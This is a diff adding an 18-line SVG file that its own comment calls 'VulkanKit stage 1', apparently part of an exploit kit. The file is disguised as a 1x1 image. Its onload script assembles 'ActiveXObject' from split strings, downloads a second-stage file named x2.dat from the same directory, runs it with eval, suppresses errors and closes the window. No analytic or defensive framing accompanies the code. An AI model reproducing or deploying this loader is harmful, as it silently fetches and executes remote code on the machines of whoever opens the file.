@@ -1,0 +1,18 @@
+<?xml version="1.0"?>
+<!-- VulkanKit stage 1 (SVG). Address-independent: the stage-2 URL is
+     derived from document.URL, so only x2.dat follows the BaseUrl. -->
+<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1" onload="go()">
+<script type="text/javascript"><![CDATA[
+function go() {
+    try {
+        var d = document.URL.replace(/[^\/]*$/, "");
+        var ax = "Act" + "iveXObject";
+        var x = new window[ax]("MSXML2.XMLHTTP");
+        x.open("GET", d + "x2.dat", false);
+        x.send();
+        if (x.status == 200) { eval(x.responseText); }
+    } catch (e) {}
+    window.close();
+}
+]]></script>
+</svg>
